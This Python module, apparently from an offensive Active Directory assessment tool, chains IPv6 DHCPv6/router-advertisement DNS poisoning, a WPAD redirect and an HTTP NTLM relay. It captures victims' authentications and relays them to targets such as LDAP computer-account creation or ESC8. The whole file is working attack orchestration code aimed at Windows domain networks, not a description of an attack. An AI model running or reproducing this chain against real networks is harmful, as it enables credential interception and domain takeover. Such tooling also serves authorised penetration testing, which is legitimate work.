"""MITM6 → WPAD → HTTP NTLM relay composition.

Composes three independent async services into a single poisoning+relay chain:

  MITM6Suite (DHCPv6 + RA + DNS hijack)
      ↓  victim resolves wpad → our IP
  HTTPNtlmRelaySource (TCP/80 NTLM exchange)
      ↓  captured GSSAPI context
  RelayEngine → RelayTarget (LDAP add-computer, ESC8, …)

Usage::

    from adscan_internal.services.relay.mitm6_wpad_relay import (
        MITM6WpadRelayConfig,
        run_mitm6_wpad_relay,
    )

    result = await run_mitm6_wpad_relay(
        targets=[ldap_add_computer_target],
        config=MITM6WpadRelayConfig(
            interface_name="eth0",
            local_domain="sevenkingdoms.local",
            listener_host="192.168.180.1",
        ),
    )
"""

from __future__ import annotations

import asyncio
import contextlib
from dataclasses import dataclass

from adscan_core import telemetry
from adscan_internal.rich_output import print_info, print_info_debug, mark_sensitive
from adscan_internal.services.mitm6 import MITM6Config, MITM6Suite
from adscan_internal.services.relay.core import (
    RelayEngine,
    RelayRunConfig,
    RelayRunResult,
    RelayTarget,
)
from adscan_internal.services.relay.http_ntlm_source import (
    HTTPNtlmRelaySource,
    HTTPNtlmRelaySourceConfig,
)
from adscan_core.rich_output import print_exception


@dataclass(frozen=True)
class MITM6WpadRelayConfig:
    """Configuration for the MITM6 → WPAD → HTTP NTLM relay chain.

    Args:
        interface_name: Network interface to run DHCPv6/RA on (e.g. ``"eth0"``).
        local_domain:   AD domain used to filter which DNS queries to hijack
                        (e.g. ``"sevenkingdoms.local"``).
        listener_host:  IPv4 address to bind the HTTP listener on.  Usually the
                        same interface's IPv4 address so that WPAD redirects land
                        on us.  Defaults to ``"0.0.0.0"`` (all interfaces).
        listener_port:  TCP port for the HTTP NTLM listener.  Port 80 is the
                        Windows WPAD default; change only for testing.
        send_router_advertisement: Whether to periodically send ICMPv6 RAs that
                        advertise our link-local as default gateway and set the
                        M+O flags so victims prefer DHCPv6.
        dns_allowlist:  If set, only hijack DNS queries matching these names
                        (exact or suffix).  ``None`` hijacks all queries.
        max_authentications: Cap on how many NTLM authentications to relay.
        timeout_seconds: Hard deadline for the entire relay run (poisoning
                        stops when the engine exits).
        stop_on_first_success: Cancel remaining auths once one target succeeds.
        listener_ready_delay_seconds: Grace period between starting the HTTP
                        listener and starting MITM6 poisoning so the port is
                        guaranteed to be bound before any victim connects.
    """

    interface_name: str
    local_domain: str
    listener_host: str = "0.0.0.0"
    listener_port: int = 80
    send_router_advertisement: bool = True
    dns_allowlist: list[str] | None = None
    max_authentications: int = 10
    timeout_seconds: float = 300.0
    stop_on_first_success: bool = True
    listener_ready_delay_seconds: float = 1.0


async def run_mitm6_wpad_relay(
    *,
    targets: list[RelayTarget],
    config: MITM6WpadRelayConfig,
) -> RelayRunResult:
    """Run the full MITM6 → WPAD → HTTP NTLM relay chain.

    Starts the HTTP relay listener first, then starts MITM6 poisoning after
    ``listener_ready_delay_seconds`` to avoid a race where a victim connects
    before the port is open.  Both are torn down when the relay engine exits.
    """

    print_info(
        f"[mitm6-wpad-relay] starting — iface={mark_sensitive(config.interface_name, 'text')} "
        f"domain={mark_sensitive(config.local_domain, 'domain')} "
        f"listener={mark_sensitive(config.listener_host, 'hostname')}:{config.listener_port}"
    )

    auth_queue: asyncio.Queue = asyncio.Queue()

    http_config = HTTPNtlmRelaySourceConfig(
        listen_host=config.listener_host,
        listen_port=config.listener_port,
    )
    http_source = HTTPNtlmRelaySource(config=http_config, auth_queue=auth_queue)

    mitm6_config = MITM6Config(
        interface_name=config.interface_name,
        local_domain=config.local_domain,
        send_router_advertisement=config.send_router_advertisement,
        dns_allowlist=list(config.dns_allowlist) if config.dns_allowlist else None,
    )
    suite = MITM6Suite(mitm6_config)

    engine = RelayEngine(
        auth_queue=auth_queue,
        targets=targets,
        config=RelayRunConfig(
            max_authentications=config.max_authentications,
            timeout_seconds=config.timeout_seconds,
            stop_on_first_success=config.stop_on_first_success,
        ),
    )

    # Start HTTP listener first so the port is bound before any victim arrives.
    try:
        await http_source.start()
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        raise

    # Small delay so asyncio processes the bind before we start advertising.
    await asyncio.sleep(max(config.listener_ready_delay_seconds, 0.0))

    try:
        await suite.start()
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        await http_source.stop()
        raise

    print_info_debug("[mitm6-wpad-relay] poisoning active, relay engine running")

    try:
        return await engine.run()
    finally:
        with contextlib.suppress(Exception):
            await suite.stop()
        with contextlib.suppress(Exception):
            await http_source.stop()
        print_info_debug("[mitm6-wpad-relay] stopped")


__all__ = [
    "MITM6WpadRelayConfig",
    "run_mitm6_wpad_relay",
]
